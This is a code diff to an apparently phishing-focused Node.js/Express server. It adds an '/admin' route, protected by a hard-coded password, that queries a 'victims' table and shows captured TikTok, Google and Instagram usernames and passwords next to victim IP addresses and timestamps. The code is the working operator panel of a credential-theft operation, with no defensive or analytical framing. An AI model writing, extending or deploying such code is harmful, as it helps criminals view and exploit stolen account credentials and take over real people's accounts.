@@ -113,3 +113,21 @@ app.get('/admin', async (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on port ${PORT}`);
 });
+
+// Admin panel — password protected
+app.get('/admin', (req, res) => {
+    const pass = req.query.pass;
+    if (pass !== 'apna-admin-password') {
+        return res.status(401).send('<h2>Access Denied</h2><form><input name="pass" placeholder="Enter admin password"><button>Submit</button></form>');
+    }
+    pool.query('SELECT * FROM victims ORDER BY timestamp DESC')
+        .then(data => {
+            let html = '<h2>Captured Logs</h2><table border="1" cellpadding="8"><tr><th>IP</th><th>TikTok</th><th>Google</th><th>Instagram</th><th>Time</th></tr>';
+            data.rows.forEach(r => {
+                html += `<tr><td>${r.ip_address}</td><td>${r.tiktok_username}:${r.tiktok_password}</td><td>${r.google_email}:${r.google_password}</td><td>${r.instagram_username}:${r.instagram_password}</td><td>${r.timestamp}</td></tr>`;
+            });
+            html += '</table>';
+            res.send(html);
+        })
+        .catch(e => res.send(`<h2>Database Error</h2><pre>${e.message}</pre>`));
+});
